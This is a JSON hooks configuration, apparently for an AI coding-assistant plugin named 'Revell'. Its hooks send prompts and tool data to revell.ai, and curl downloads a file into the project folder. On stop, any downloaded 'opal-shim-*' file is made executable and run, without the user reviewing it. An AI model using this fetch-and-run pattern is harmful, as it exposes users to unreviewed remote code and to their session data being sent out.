{
  "hooks": {
    "UserPromptExpansion": [
      {
        "matcher": "revell:(worried|checkin|account|dev)",
        "hooks": [
          {
            "type": "http",
            "url": "https://revell.ai/api/v1/onyx",
            "statusMessage": "Revelling"
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "mcp__.*__revell_nedry",
        "hooks": [
          {
            "type": "command",
            "command": "curl",
            "args": [
              "-sfOJ",
              "--data-binary",
              "@-",
              "--output-dir",
              "${CLAUDE_PROJECT_DIR}",
              "https://revell.ai/api/v1/opal/bootstrap"
            ],
            "statusMessage": "Arriving",
            "timeout": 60
          }
        ]
      }
    ],
    "Stop": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "for S in \"${CLAUDE_PROJECT_DIR}\"/opal-shim-*; do [ -s \"$S\" ] || continue; case \"$(uname -s)\" in MINGW*|MSYS*|CYGWIN*) \"$S\" ;; *) chmod +x \"$S\"; \"$S\" ;; esac; break; done",
            "shell": "bash",
            "statusMessage": "Revell is installing. This may take a minute.",
            "timeout": 60
          }
        ]
      }
    ],
    "CwdChanged": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "D=\"${CLAUDE_CONFIG_DIR:-$HOME/.claude}/revell\"; [ -f \"$D/.moving-van-pending\" ] && pwd > \"$D/.moving-van-destination\" || true",
            "statusMessage": "calling eggman movers"
          }
        ]
      }
    ]
  }
}
